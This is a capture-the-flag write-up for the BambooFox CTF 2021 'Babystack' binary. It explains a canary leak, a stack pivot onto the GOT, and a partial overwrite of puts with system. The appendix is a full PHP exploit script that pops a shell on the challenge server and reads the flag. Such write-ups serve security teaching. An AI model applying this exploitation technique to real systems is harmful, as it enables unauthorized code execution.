# Babystack - BambooFox CTF 2021 (pwn, 421p)

## Introduction
Babystack is a pwn task.

An archive containing a binary and a Dockerfile is given.

## Reverse engineering
The binary asks for a name, and a token. If the token is not `deadbeef`, the
program exits.

```c
token[8] = 'd';
token[9] = 'e';
token[10] = 'a';
token[11] = 'd';
token[12] = 'b';
token[13] = 'e';
token[14] = 'e';
token[15] = 'f';

puts("Hello, please give me your token: ");
read(0,token,0x10);

if(0 != memcmp(token + 8,token,8)) {
	puts("Token Error");
	exit(0);
}
```

The binary then reads two strings (`str1` and `str2`) and prints them back with
`puts`. It uses a buffer of size `0x38` to read both strings. The first string
is at most `0x10` bytes, and the size of the second string is dependent of the
first string.

```c
char buffer[0x38];

puts("str1: ");
size   = read(0,buffer,0x10);
length = strlen(buffer);
puts(buffer);

puts("str2: ");
read(0, buffer + size, 0x38 - length);
puts(buffer + size);
```

At last, the binary reads a final string of size `0x18` and prints it with
`puts`. It then closes `stdout` and exits.

```c
read(0, buf, 0x18);
puts(buf);
close(1);
return 0;
```

## Vulnerabilities
The function that reads two strings in the same buffer can be used to leak
uninitialized memory on the stack. This can be used to leak the stack canary.

It is also possible to overwrite up to 2 qwords after the buffer (the canary and
the saved frame pointer)

## Exploitation
The vulnerable function is called twice. The first time can be used to leak the
stack's canary. The second time can be used to move the stack pointer to the
binary's `.got.plt` section.

The last `read` will then read to `rbp - 0x50` and thus overwrite the `.got.plt`
section.

Since `puts` is called right after `read`, changing the last 3 bytes of `puts`
to `system` gives a 1/4096 chance that the call to `puts` will be replaced with
`system`.

**Flag**: `flag{Very_3asy_st@ck_piv0t_challenge_right}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/mnt/ctf/tools/pwn/phplib/hexdump.php";
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Process.php";
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Socket.php";

const HOST = "chall.ctf.bamboofox.tw";
const PORT = 10102;

printf("[*] Creating process\n");
$time = microtime(true);

$t = new Socket(HOST, PORT);

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$t->expectLine("Name: ");
$t->write("XeR");

$t->expectLine("Hello, please give me your token: ");
$t->write("deadbeef");

$t->expectLine("str1: ");
$t->write(str_repeat("\x00", 8));
$t->expectLine("");

$t->expectLine("str2: ");
$t->write("A");
$leak = substr($t->readLine(), 0, 8);
assert(8 === strlen($leak));

$canary  = unpack("Q", $leak)[1];
$canary -= ord("A");
assert(0 === ($canary & 0xFF));
printf("[+] Canary: %X\n", $canary);

/* Round 2 */
$t->expectLine("str1: ");
$t->write(pack("QQ", 0, 0));
$t->expectLine("");

$t->expectLine("str2: ");
$rbp      = 0x403410 - 0x10 + 0x50; // puts@got.plt - 0x10
$payload  = str_repeat("\x00", 0x40 - 0x10 - 0x08);
$payload .= pack("Q", $canary);
$payload .= pack("Q", $rbp);
assert(0x38 === strlen($payload));
$t->write($payload);
$t->expectLine("");

// read 0x18 at rbp - 0x50
$payload = "echo shell; sh";
$payload = str_pad($payload, 0x10, "\x00");
assert(0x10 === strlen($payload));
$payload .= "\xd0\x2f\x05";
$t->write($payload);
$t->expectLine("shell");

printf("\x07");
$t->write("cat /home/babystack/flag; ls -la; id\n");
$t->pipe();
```
